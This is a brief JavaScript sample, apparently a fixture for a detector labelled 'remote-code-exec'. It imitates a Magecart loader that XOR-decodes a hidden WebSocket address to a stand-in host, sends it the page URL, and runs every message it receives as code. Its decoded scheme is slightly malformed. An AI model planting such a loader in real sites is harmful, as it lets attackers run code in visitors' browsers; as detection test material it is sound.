// expect: remote-code-exec
// Modeled on cside, "New Magecart attack code revealed" (2024): the WebSocket URL is XOR-decoded from a
// number array, and every message received is executed as code.
const qbq = [93, 89, 89, 0, 5, 5, 71, 79, 94, 88, 67, 73, 89, 4, 79, 82, 75, 71, 90, 70, 79, 5];
const zep = 42;
const ws = new WebSocket(String.fromCharCode(...qbq.map((hwo) => hwo ^ zep)) + encodeURIComponent(location.href));
ws.addEventListener('message', (event) => { new Function(event.data)(); });
